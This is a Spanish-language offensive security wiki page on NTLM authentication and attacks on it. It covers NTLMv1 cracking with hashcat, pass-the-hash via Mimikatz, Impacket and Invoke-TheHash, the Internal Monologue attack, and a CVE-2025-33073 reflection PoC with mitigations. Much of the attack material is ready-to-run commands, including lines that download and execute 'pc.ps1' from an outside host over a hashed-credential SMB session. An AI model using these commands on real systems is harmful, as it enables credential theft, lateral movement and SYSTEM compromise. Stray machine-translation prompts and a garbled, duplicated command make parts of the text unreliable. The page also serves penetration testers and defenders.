# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Información básica

En entornos donde **Windows XP y Server 2003** están en funcionamiento, se utilizan hashes LM (Lan Manager), aunque es ampliamente reconocido que estos pueden verse comprometidos fácilmente. Un hash LM concreto, `AAD3B435B51404EEAAD3B435B51404EE`, indica una situación en la que LM no se utiliza, ya que representa el hash de una cadena vacía.

De forma predeterminada, el protocolo de autenticación **Kerberos** es el método principal utilizado. NTLM (NT LAN Manager) interviene en circunstancias específicas: ausencia de Active Directory, inexistencia del dominio, funcionamiento incorrecto de Kerberos debido a una configuración inadecuada o cuando se intenta establecer una conexión utilizando una dirección IP en lugar de un hostname válido.

La presencia de la cabecera **"NTLMSSP"** en los paquetes de red indica un proceso de autenticación NTLM.

La compatibilidad con los protocolos de autenticación - LM, NTLMv1 y NTLMv2 - la proporciona una DLL específica ubicada en `%windir%\Windows\System32\msv1\_0.dll`.

**Puntos clave**:

- Los hashes LM son vulnerables y un hash LM vacío (`AAD3B435B51404EEAAD3B435B51404EE`) indica que no se utiliza.
- Kerberos es el método de autenticación predeterminado, mientras que NTLM solo se utiliza bajo determinadas condiciones.
- Los paquetes de autenticación NTLM se identifican mediante la cabecera "NTLMSSP".
- Los protocolos LM, NTLMv1 y NTLMv2 son compatibles con el archivo del sistema `msv1\_0.dll`.

## LM, NTLMv1 y NTLMv2

Puedes comprobar y configurar qué protocolo se utilizará:

### GUI

Ejecuta _secpol.msc_ -> Directivas locales -> Opciones de seguridad -> Seguridad de red: nivel de autenticación de LAN Manager. Hay 6 niveles (del 0 al 5).

![LM, NTLMv1 y NTLMv2 - GUI: Ejecuta secpol.msc - Directivas locales - Opciones de seguridad - Seguridad de red: nivel de autenticación de LAN Manager. Hay 6 niveles (del 0 al 5)](<../../images/image (919).png>)

### Registro

Esto establecerá el nivel 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valores posibles:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Esquema básico de autenticación de dominio NTLM

1. El **usuario** introduce sus **credenciales**
2. La máquina cliente **envía una solicitud de autenticación** enviando el **nombre del dominio** y el **nombre de usuario**
3. El **servidor** envía el **challenge**
4. El **cliente cifra** el **challenge** usando como clave el hash de la contraseña y lo envía como respuesta
5. El **servidor envía** al **controlador de dominio** el **nombre del dominio, el nombre de usuario, el challenge y la respuesta**. Si no hay un Active Directory configurado o el nombre del dominio es el nombre del servidor, las credenciales se **comprueban localmente**.
6. El **controlador de dominio comprueba si todo es correcto** y envía la información al servidor

El **servidor** y el **controlador de dominio** pueden crear un **Secure Channel** mediante el servidor **Netlogon**, ya que el controlador de dominio conoce la contraseña del servidor (está dentro de la base de datos **NTDS.DIT**).

### Esquema de autenticación NTLM local

La autenticación es como la mencionada **anteriormente, pero** el **servidor** conoce el **hash del usuario** que intenta autenticarse dentro del archivo **SAM**. Por lo tanto, en lugar de preguntar al controlador de dominio, el **servidor comprobará por sí mismo** si el usuario puede autenticarse.

### Challenge NTLMv1

La **longitud del challenge es de 8 bytes** y la **respuesta** tiene una longitud de **24 bytes**.

El **hash NT (16bytes)** se divide en **3 partes de 7bytes cada una** (7B + 7B + (2B+0x00\*5)): la **última parte se rellena con ceros**. Después, el **challenge** se **cifra por separado** con cada parte y los bytes cifrados **resultantes** se **unen**. Total: 8B + 8B + 8B = 24Bytes.

**Problemas**:

- Falta de **aleatoriedad**
- Las 3 partes pueden ser **atacadas por separado** para encontrar el hash NT
- **DES se puede crackear**
- La tercera clave está compuesta siempre por **5 ceros**.
- Dado el **mismo challenge**, la **respuesta** será la **misma**. Por lo tanto, puedes proporcionar a la víctima como **challenge** la cadena "**1122334455667788**" y atacar la respuesta usando **rainbow tables** precalculadas.

### Ataque NTLMv1

Actualmente es cada vez menos común encontrar entornos con Unconstrained Delegation configurado, pero esto no significa que no puedas **abusar de un servicio Print Spooler** configurado.

Podrías abusar de algunas credenciales/sesiones que ya tienes en el AD para **pedir a la impresora que se autentique** contra algún **host bajo tu control**. Después, usando `metasploit auxiliary/server/capture/smb` o `responder`, puedes **establecer el challenge de autenticación a 1122334455667788**, capturar el intento de autenticación y, si se realizó usando **NTLMv1**, podrás **crackearlo**.\
Si estás usando `responder`, podrías intentar **usar el flag `--lm`** para intentar **degradar** la **autenticación**.\
_Ten en cuenta que, para esta técnica, la autenticación debe realizarse usando NTLMv1 (NTLMv2 no es válido)._

Recuerda que la impresora utilizará la cuenta del equipo durante la autenticación, y las cuentas de equipo utilizan **contraseñas largas y aleatorias** que **probablemente no podrás crackear** usando **diccionarios** comunes. Sin embargo, la autenticación **NTLMv1** **utiliza DES** ([más información aquí](#ntlmv1-challenge)), por lo que, usando algunos servicios especialmente dedicados a crackear DES, podrás crackearla (podrías usar [https://crack.sh/](https://crack.sh) o [https://ntlmv1.com/](https://ntlmv1.com), por ejemplo).

### Ataque NTLMv1 con hashcat

NTLMv1 también se puede romper con NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), que formatea los mensajes NTLMv1 de un método que se puede romper con hashcat.<sup>[[1]](#references)</sup>

El comando
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Please provide the content to translate.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Falta el contenido del archivo. Envíamelo después de los dos puntos.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Ejecuta hashcat (lo mejor es distribuirlo mediante una herramienta como hashtopolis), ya que de lo contrario tardará varios días.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
En este caso sabemos que la contraseña es password, así que vamos a hacer trampa para fines de demostración:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Ahora necesitamos usar hashcat-utilities para convertir las claves des crackeadas en partes del hash NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Finalmente, la última parte:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the content you want me to combine and translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Challenge NTLMv2

La **longitud del challenge es de 8 bytes** y se envían **2 respuestas**: una tiene **24 bytes** de longitud y la longitud de la **otra** es **variable**.

**La primera respuesta** se crea cifrando mediante **HMAC_MD5** la **cadena** compuesta por el **cliente y el dominio**, y utilizando como **clave** el **hash MD4** del **NT hash**. Después, el **resultado** se utilizará como **clave** para cifrar mediante **HMAC_MD5** el **challenge**. A esto se añadirá un **client challenge de 8 bytes**. Total: 24 B.

**La segunda respuesta** se crea utilizando **varios valores** (un nuevo client challenge, un **timestamp** para evitar **replay attacks**...)

Si tienes un **pcap que haya capturado un proceso de autenticación correcto**, puedes seguir esta guía para obtener el dominio, el username, el challenge y la respuesta, e intentar crackear la contraseña: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Una vez que tengas el hash de la víctima**, puedes utilizarlo para **suplantarla**.\
Necesitas utilizar una **tool** que **realice** la **autenticación NTLM utilizando** ese **hash**, **o** podrías crear una nueva **sessionlogon** e **inyectar** ese **hash** dentro de **LSASS**, de modo que, cuando se **realice cualquier autenticación NTLM**, **se utilice ese hash**. Esta última opción es la que realiza mimikatz.

**Recuerda que también puedes realizar ataques Pass-the-Hash utilizando cuentas de equipo.**

### **Mimikatz**

**Debe ejecutarse como administrador**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Esto lanzará un proceso que pertenecerá a los usuarios que han iniciado mimikatz, pero internamente en LSASS las credenciales guardadas son las que se encuentran en los parámetros de mimikatz. Entonces, puedes acceder a recursos de red como si fueras ese usuario (similar al truco de `runas /netonly`, pero no necesitas conocer la contraseña en texto plano).

### Pass-the-Hash desde Linux

Puedes obtener ejecución de código en máquinas Windows usando Pass-the-Hash desde Linux.\
[**Accede aquí para aprender a hacerlo.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Herramientas compiladas de Impacket para Windows

Puedes descargar[ los binarios de impacket para Windows aquí](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (En este caso necesitas especificar un comando; cmd.exe y powershell.exe no son válidos para obtener un shell interactivo)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Hay varios binarios más de Impacket...

### Invoke-TheHash

Puedes obtener los scripts de powershell aquí: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Esta función es una **mezcla de todas las demás**. Puedes pasar **varios hosts**, **excluir** algunos y **seleccionar** la **opción** que quieras usar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si seleccionas **SMBExec** o **WMIExec**, pero **no** proporcionas ningún parámetro _**Command**_, simplemente **comprobará** si tienes **permisos suficientes**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Debe ejecutarse como administrador**

Esta herramienta hará lo mismo que mimikatz (modificar la memoria de LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ejecución remota manual de Windows con nombre de usuario y contraseña


{{#ref}}
../lateral-movement/
{{#endref}}

## Extracción de credenciales de un Host Windows

**Para obtener más información sobre** [**cómo obtener credenciales de un host Windows, consulta esta página**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Ataque Internal Monologue

El Internal Monologue Attack es una técnica sigilosa de extracción de credenciales que permite a un atacante recuperar hashes NTLM de la máquina víctima **sin interactuar directamente con el proceso LSASS**. A diferencia de Mimikatz, que lee los hashes directamente de la memoria y suele ser bloqueado por las soluciones de seguridad de endpoints o Credential Guard, este ataque utiliza **llamadas locales al paquete de autenticación NTLM (MSV1_0) mediante la Security Support Provider Interface (SSPI)**. Primero, el atacante **degrada la configuración de NTLM** (por ejemplo, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) para garantizar que NetNTLMv1 esté permitido. Después, suplanta los tokens de usuario existentes obtenidos de los procesos en ejecución y activa la autenticación NTLM localmente para generar respuestas NetNTLMv1 usando un challenge conocido.<sup>[[4]](#references)</sup>

Después de capturar estas respuestas NetNTLMv1, el atacante puede recuperar rápidamente los hashes NTLM originales mediante **rainbow tables precalculadas**, lo que permite realizar más ataques Pass-the-Hash para el movimiento lateral. Lo más importante es que el Internal Monologue Attack sigue siendo sigiloso porque no genera tráfico de red, no inyecta código ni activa volcados directos de memoria, lo que dificulta su detección para los defensores en comparación con métodos tradicionales como Mimikatz.

Si NetNTLMv1 no es aceptado debido a políticas de seguridad aplicadas, el atacante puede no conseguir recuperar una respuesta NetNTLMv1.

Para gestionar este caso, la herramienta Internal Monologue fue actualizada: adquiere dinámicamente un token de servidor mediante `AcceptSecurityContext()` para **capturar respuestas NetNTLMv2** si NetNTLMv1 falla. Aunque NetNTLMv2 es mucho más difícil de crackear, todavía permite realizar relay attacks o fuerza bruta offline en casos limitados.

El PoC se encuentra en **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay y Responder

**Lee una guía más detallada sobre cómo realizar esos ataques aquí:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Analizar challenges NTLM desde una captura de red

**Puedes usar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## *Reflection* de NTLM y Kerberos mediante SPNs serializados (CVE-2025-33073)

Windows contiene varias mitigaciones que intentan evitar los ataques de *reflection*, en los que una autenticación NTLM (o Kerberos) que se origina en un host se retransmite de vuelta al **mismo** host para obtener privilegios de SYSTEM.

Microsoft rompió la mayoría de las cadenas públicas con MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) y parches posteriores; sin embargo, **CVE-2025-33073** demuestra que las protecciones todavía pueden eludirse abusando de la forma en que el **cliente SMB trunca los Service Principal Names (SPNs)** que contienen información de destino *marshalled* (serializada).<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR del bug
1. Un atacante registra un **registro A de DNS** cuya etiqueta codifica un SPN *marshalled*, por ejemplo:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Se induce a la víctima a autenticarse en ese hostname (PetitPotam, DFSCoerce, etc.).
3. Cuando el cliente SMB pasa la cadena de destino `cifs/srv11UWhRCAAAAA…` a `lsasrv!LsapCheckMarshalledTargetInfo`, la llamada a `CredUnmarshalTargetInfo` **elimina el blob serializado**, dejando **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (o el equivalente de Kerberos) considera ahora que el destino es *localhost* porque la parte corta del host coincide con el nombre del equipo (`SRV1`).
5. En consecuencia, el servidor establece `NTLMSSP_NEGOTIATE_LOCAL_CALL` e inyecta el **access-token SYSTEM de LSASS** en el contexto (en Kerberos se crea una subsession key marcada como SYSTEM).
6. Retransmitir esa autenticación con `ntlmrelayx.py` **o** `krbrelayx.py` otorga derechos completos de SYSTEM en el mismo host.<sup>[[5]](#references)</sup>

### PoC rápida
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Parches y mitigaciones
* El parche KB para **CVE-2025-33073** añade una comprobación en `mrxsmb.sys::SmbCeCreateSrvCall` que bloquea cualquier conexión SMB cuyo objetivo contenga información marshalizada (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Aplicar **SMB signing** para evitar la reflexión incluso en hosts sin parchear.
* Monitorizar registros DNS que se parezcan a `*<base64>...*` y bloquear vectores de coerción (PetitPotam, DFSCoerce, AuthIP...).

### Ideas de detección
* Capturas de red con `NTLMSSP_NEGOTIATE_LOCAL_CALL` donde la IP del cliente ≠ la IP del servidor.
* AP-REQ de Kerberos que contenga una clave de subsesión y un principal de cliente igual al hostname.
* Logons de Windows 4624/4648 de SYSTEM seguidos inmediatamente por escrituras SMB remotas desde el mismo host.<sup>[[5]](#references)</sup>

Para la variante de reflexión local de **marzo de 2026**, que abusa de **puertos arbitrarios de SMB** y la **reutilización de conexiones TCP** para alcanzar `NT AUTHORITY\SYSTEM`, consulta:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Referencias
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
